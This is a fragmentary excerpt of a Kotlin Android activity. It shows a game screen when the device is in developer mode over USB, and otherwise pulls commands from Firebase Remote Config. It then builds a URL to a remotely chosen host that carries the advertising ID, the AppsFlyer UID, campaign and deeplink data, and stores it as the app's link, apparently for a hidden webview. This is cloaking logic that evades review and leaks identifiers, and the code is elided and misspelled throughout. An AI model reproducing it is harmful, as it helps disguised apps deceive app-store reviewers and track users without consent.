...
import com.gs.vest.ask.util.*
import com.gs.vest.ask.util.manager.DataStoreManager
import com.gs.vest.ask.util.network.internetConnection
...
//                            }
                            ...
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@Main, R.color.black)
...
//    }
        ...
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                ...
                "Bad"  -> {
                    ...
                    if (isDevMode(this@Main) && isUSB(this@Main)) startFragmentIdFlow.emit(R.id.gameFragment)
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@Main) { task ->
                                if (task.isSuccessful) {
                                    val devstr = getString("Devstreet")
                                    log("get data fom remote = $devstr")
                                    JSONObject(devstr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            dataRemonte(jsonObj.getString("crew"), jsonObj.getBoolean("partly"), jsonObj.getString("gather"))
                                        }
                                    }

                                } else {
                                    log("fail get data = ${this.all}")
    ...
    private suspend fun dataRemonte(comand: String, partly: Boolean, gather: String) {
        if (partly) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    ...
                    val fiillGat = gather + "?" +
                            "adursid=${advertisingId}&" +
                            "asflati_ud=${appsflyerUID}&" +
                            "comicping=${AppsflyerUtil.campaignFlow.value}&" +
                            "dolinkleo=${FacebookUtil.deeplinkFlow.value}"

                    log("fillGat = $fiillGat")
                    ...
                    coroutine.launch(Dispatchers.IO) {
                        ...
                        if (comand.length != 2023) DataStoreManager.Key.update { "Good" }
                        DataStoreManager.Link.update { fiillGat }
                    }
                }

                AppsflyerUtil.initialize(this@Main)
                coroutine.launch {
